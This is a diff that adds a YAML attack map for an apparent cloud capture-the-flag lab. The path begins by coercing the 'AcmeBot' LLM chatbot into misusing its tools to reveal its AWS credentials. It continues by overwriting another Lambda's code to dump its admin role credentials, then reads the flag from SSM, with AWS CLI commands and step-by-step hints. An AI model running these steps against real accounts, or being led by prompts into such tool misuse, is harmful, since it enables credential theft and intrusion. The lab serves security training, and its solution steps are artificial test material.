@@ -1,0 +1,112 @@
+attackMap:
+  nodes:
+    - id: acmebot-lambda
+      label: "AcmeBot Chatbot"
+      type: resource
+      subType: lambda-function
+      arn: "arn:aws:lambda:{region}:{account_id}:function/pl-prod-ctf-002-acmebot"
+      access:
+        type: public-network
+        url: "https://{function_url_id}.lambda-url.{region}.on.aws/"
+      description: >
+        This resource is publicly accessible without AWS credentials. This is your entry point.
+
+        Note: You will need to enter your own OpenAI API key here, which will be used for the demo
+
+    - id: chatbot-role
+      label: "Chatbot Role"
+      type: principal
+      subType: iam-role
+      arn: "arn:aws:iam::{account_id}:role/pl-prod-ctf-002-chatbot-role"
+      description: >
+        This is the Lambda execution role for AcmeBot.
+
+    - id: data-processor-lambda
+      label: "Data Processor"
+      type: resource
+      subType: lambda-function
+      arn: "arn:aws:lambda:{region}:{account_id}:function/pl-prod-ctf-002-acme-data-processor"
+      description: >
+        An internal Lambda function used by Acme Corp's data processing pipeline.      
+
+    - id: target-role
+      label: "Admin Role"
+      type: principal
+      subType: iam-role
+      isTarget: true
+      arn: "arn:aws:iam::{account_id}:role/pl-prod-ctf-002-target-role"
+      description: >
+        The execution role attached to the data processor Lambda. Gaining access to these
+        credentials is your final objective -- once you have them, find the flag.
+
+  edges:
+    - from: acmebot-lambda
+      to: chatbot-role
+      label: "Prompt coercion"
+      description: >
+        Enter your own OpenAI API key to get started, then start interacting with the 
+        agent. Try to get the agent to give you information that might lead to lateral 
+        movement within the cloud control plane. 
+      commands:
+        - description: "Open the chatbot URL and send a prompt payload"
+          command: "# In the chatbot UI, try to get the chatbot to run a diagnostic command that reveals environment variables"
+        - description: "Extract the credentials from the chatbot's response"
+          command: "export AWS_ACCESS_KEY_ID=\"ASIA...\"\nexport AWS_SECRET_ACCESS_KEY=\"...\"\nexport AWS_SESSION_TOKEN=\"...\""
+        - description: "Confirm identity as the chatbot role"
+          command: "aws sts get-caller-identity"
+        - description: "Confirm the flag is not directly accessible with these credentials"
+          command: "aws ssm get-parameter --name /ctf/ctf-002/flag --with-decryption"
+      hints:
+        - "The chatbot has tools it can invoke. What happens if you ask it to help with a server diagnostic?"
+        - "LLMs can sometimes be coerced into using their tools in unintended ways through carefully crafted prompts"
+        - "Lambda functions run with an IAM execution role. Those credentials are available inside the runtime environment."
+        - "Think about what shell commands reveal the environment a process is running in."
+        - "Once you have credentials, verify your identity with the STS service and try to access the flag directly -- you will find you cannot."
+        - "But maybe there is a way to use the principal you do have access to, to compromised another principal that does have access to the flag?"
+
+    - from: chatbot-role
+      to: data-processor-lambda
+      label: "Code replacement"
+      description: >
+        Using the chatbot role credentials, enumerate what Lambda functions exist and what
+        permissions you have over them. Then find a way to influence the data processor's
+        behavior.
+      commands:
+        - description: "List Lambda functions to find the data processor"
+          command: "aws lambda list-functions --query 'Functions[*].{Name:FunctionName,Role:Role}' --output table"
+        - description: "Inspect the target Lambda's execution role"
+          command: "aws lambda get-function --function-name <data-processor-function-name> --query 'Configuration.{Role:Role,Runtime:Runtime}'"
+        - description: "Check what policies are attached to the target role"
+          command: "aws iam list-attached-role-policies --role-name <target-role-name>"
+        - description: "Create a handler that reads and returns its own environment variables, then package it as a zip"
+          command: "# Write a handler in the function's runtime language that returns process environment variables as JSON"
+        - description: "Replace the target Lambda's code with your handler"
+          command: "aws lambda update-function-code --function-name <data-processor-function-name> --zip-file fileb://<your-zip>"
+      hints:
+        - "Start by enumerating what Lambda functions exist in the account. Look closely at the execution role each one uses."
+        - "Find a Lambda whose role suggests it runs with elevated privileges. Confirm by checking what policies are attached to that role."
+        - "Think about what you can do with write access to a Lambda function. If you control the code, what do you control?"
+        - "A Lambda function's execution role credentials are available as environment variables inside the runtime. If you replace the code, those variables are yours to read."
+        - "Package your handler as a zip file in the function's runtime language before uploading."
+
+    - from: data-processor-lambda
+      to: target-role
+      label: "Privileged invocation"
+      description: >
+        Invoke the now-modified data processor Lambda. Your code runs under the privileged
+        execution role -- extract those credentials from the response and use them to capture
+        the flag.
+      commands:
+        - description: "Invoke the data processor to retrieve admin credentials"
+          command: "aws lambda invoke --function-name <data-processor-function-name> --payload '{}' /tmp/response.json && cat /tmp/response.json"
+        - description: "Parse the response body and export the admin credentials"
+          command: "# Extract AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, and AWS_SESSION_TOKEN from the response JSON and export them"
+        - description: "Verify admin access"
+          command: "aws sts get-caller-identity"
+        - description: "Read the CTF flag"
+          command: "aws ssm get-parameter --name /ctf/ctf-002/flag --with-decryption --query 'Parameter.Value' --output text"
+      hints:
+        - "Once you have replaced the function code, invoke the data processor. The response contains the output of your handler."
+        - "The response body is a JSON string -- parse it to extract the individual credential fields."
+        - "Export the new credentials and verify your identity with the STS service."
+        - "With these credentials, look for the flag in the service commonly used to securely store secrets and configuration values."
